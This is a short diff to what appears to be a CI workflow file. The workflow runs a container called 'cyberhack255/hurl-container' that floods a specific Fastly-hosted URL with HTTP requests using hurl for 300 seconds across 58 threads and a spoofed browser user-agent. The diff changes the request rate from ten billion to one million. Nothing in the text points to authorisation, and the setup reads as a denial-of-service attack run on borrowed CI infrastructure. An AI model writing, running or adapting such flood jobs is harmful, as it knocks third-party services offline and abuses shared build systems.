@@ -22,7 +22,7 @@ jobs:
             image: cyberhack255/hurl-container
             run: | 
                   export url="https://ss007.global.ssl.fastly.net/"
-                  hurl $url --seconds=300 --rate=10000000000 --thread=58 --header=user-agent:'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/600.00'
+                  hurl $url --seconds=300 --rate=1000000 --thread=58 --header=user-agent:'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/600.00'
   # running-command2:
     # runs-on: ubuntu-latest
 
